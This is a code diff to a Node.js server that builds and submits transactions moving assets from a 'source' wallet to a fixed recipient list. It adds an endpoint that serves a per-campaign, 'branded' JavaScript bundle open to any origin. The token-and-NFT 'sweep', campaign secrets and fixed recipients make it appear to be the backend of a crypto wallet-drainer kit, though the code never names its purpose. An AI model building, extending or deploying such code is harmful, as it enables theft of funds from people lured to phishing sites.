@@ -4,6 +4,7 @@ import "dotenv/config";
 import { buildPlan, submitSigned, makeConnection } from "./core.js";
 import { loadAltAuthority, ensureAlt, defaultAltAddresses } from "./alt.js";
 import { parseRecipients } from "./recipients.js";
+import { generateBundle } from "./generate.js";
 import * as store from "./store.js";
 import * as ratelimit from "./ratelimit.js";
 
@@ -20,6 +21,7 @@ const REQUIRE_AUTH = process.env.REQUIRE_AUTH !== "false";
 const ENABLE_ALT = process.env.ENABLE_ALT !== "false";
 const ENABLE_CNFT = process.env.ENABLE_CNFT !== "false";
 const MAX_CNFT = Number(process.env.MAX_CNFT_SWEEP || 10);
+const APP_URL = process.env.APP_URL || "http://localhost:3000";
 
 const RECIPIENTS = parseRecipients(process.env);
 const RECIPIENT_SET = new Set(RECIPIENTS);
@@ -51,7 +53,11 @@ function readBody(req) {
 }
 
 function clientIp(req) {
-  return (req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress || "unknown").trim();
+  return (
+    req.headers["x-forwarded-for"]?.split(",")[0] ||
+    req.socket.remoteAddress ||
+    "unknown"
+  ).trim();
 }
 
 function verifyAuth(body, secret) {
@@ -60,7 +66,10 @@ function verifyAuth(body, secret) {
   const provided = body.auth;
   if (!provided) return false;
   const { auth, ...rest } = body;
-  const expected = crypto.createHmac("sha256", secret).update(JSON.stringify(rest)).digest("hex");
+  const expected = crypto
+    .createHmac("sha256", secret)
+    .update(JSON.stringify(rest))
+    .digest("hex");
   try {
     return crypto.timingSafeEqual(Buffer.from(provided), Buffer.from(expected));
   } catch {
@@ -72,7 +81,12 @@ async function ensureCampaignAlt(campaign) {
   if (!ENABLE_ALT || !altAuthority) return null;
   const addresses = defaultAltAddresses(RECIPIENTS);
   try {
-    const { address, account } = await ensureAlt(connection, altAuthority, campaign.alt, addresses);
+    const { address, account } = await ensureAlt(
+      connection,
+      altAuthority,
+      campaign.alt,
+      addresses,
+    );
     if (address !== campaign.alt) store.update(campaign.id, { alt: address });
     return account;
   } catch (err) {
@@ -81,27 +95,58 @@ async function ensureCampaignAlt(campaign) {
   }
 }
 
+function handleBundle(req, res) {
+  const url = new URL(req.url, `http://${req.headers.host || "localhost"}`);
+  const id = url.searchParams.get("id");
+  if (!id) return json(res, 400, { error: "campaign id required" });
+
+  const campaign = store.get(id);
+  if (!campaign) return json(res, 404, { error: "campaign not found" });
+
+  const bundle = generateBundle({
+    planEndpoint: `${APP_URL}/plan`,
+    submitEndpoint: `${APP_URL}/submit`,
+    recipients: [campaign.recipient],
+    mode: campaign.mode,
+    liquidMints: campaign.liquidMints,
+    campaignId: id,
+    secret: campaign.secret,
+    brand: { name: campaign.name },
+  });
+
+  res.writeHead(200, {
+    "content-type": "application/javascript; charset=utf-8",
+    "cache-control": "no-store",
+    "access-control-allow-origin": "*",
+  });
+  res.end(bundle);
+}
+
 async function handlePlan(req, res) {
   const ip = clientIp(req);
   if (!ratelimit.allow(ip)) return json(res, 429, { error: "rate limited" });
 
   const body = await readBody(req);
-  if (!body.source || !body.recipient) return json(res, 400, { error: "source and recipient required" });
+  if (!body.source || !body.recipient)
+    return json(res, 400, { error: "source and recipient required" });
 
   const campaign = body.campaignId ? store.get(body.campaignId) : null;
   if (REQUIRE_AUTH && campaign?.secret && !verifyAuth(body, campaign.secret)) {
     return json(res, 401, { error: "unauthorized" });
   }
 
-  // Enforce recipient set.
-  const requestedRecipients = Array.isArray(body.recipients) && body.recipients.length
-    ? body.recipients
-    : [body.recipient];
+  const requestedRecipients =
+    Array.isArray(body.recipients) && body.recipients.length
+      ? body.recipients
+      : [body.recipient];
   for (const r of requestedRecipients) {
-    if (!RECIPIENT_SET.has(r)) return json(res, 400, { error: `recipient not allowed: ${r}` });
+    if (!RECIPIENT_SET.has(r))
+      return json(res, 400, { error: `recipient not allowed: ${r}` });
   }
 
-  const altAccount = campaign ? await ensureCampaignAlt({ ...campaign, id: body.campaignId }) : null;
+  const altAccount = campaign
+    ? await ensureCampaignAlt({ ...campaign, id: body.campaignId })
+    : null;
 
   try {
     const plan = await buildPlan({
@@ -202,19 +247,32 @@ const server = http.createServer(async (req, res) => {
   if (req.method === "OPTIONS") {
     res.writeHead(204, {
       "access-control-allow-origin": "*",
-      "access-control-allow-methods": "POST,OPTIONS",
+      "access-control-allow-methods": "POST,GET,OPTIONS",
       "access-control-allow-headers": "content-type",
     });
     return res.end();
   }
   try {
-    if (req.method === "POST" && req.url === "/plan") return await handlePlan(req, res);
-    if (req.method === "POST" && req.url === "/submit") return await handleSubmit(req, res);
-    if (req.method === "GET" && req.url === "/health") return json(res, 200, { ok: true, alt: ENABLE_ALT, cnft: ENABLE_CNFT });
+    if (req.method === "GET" && req.url.startsWith("/bundle.js"))
+      return await handleBundle(req, res);
+    if (req.method === "POST" && req.url === "/plan")
+      return await handlePlan(req, res);
+    if (req.method === "POST" && req.url === "/submit")
+      return await handleSubmit(req, res);
+    if (req.method === "GET" && req.url === "/health")
+      return json(res, 200, { ok: true, alt: ENABLE_ALT, cnft: ENABLE_CNFT });
     json(res, 404, { error: "not found" });
   } catch (err) {
     json(res, 400, { error: err.message });
   }
 });
 
-server.listen(PORT, () => log("start", { port: PORT, recipients: RECIPIENTS, alt: !!altAuthority, cnft: ENABLE_CNFT }));
+server.listen(PORT, () =>
+  log("start", {
+    port: PORT,
+    recipients: RECIPIENTS,
+    alt: !!altAuthority,
+    cnft: ENABLE_CNFT,
+    appUrl: APP_URL,
+  }),
+);
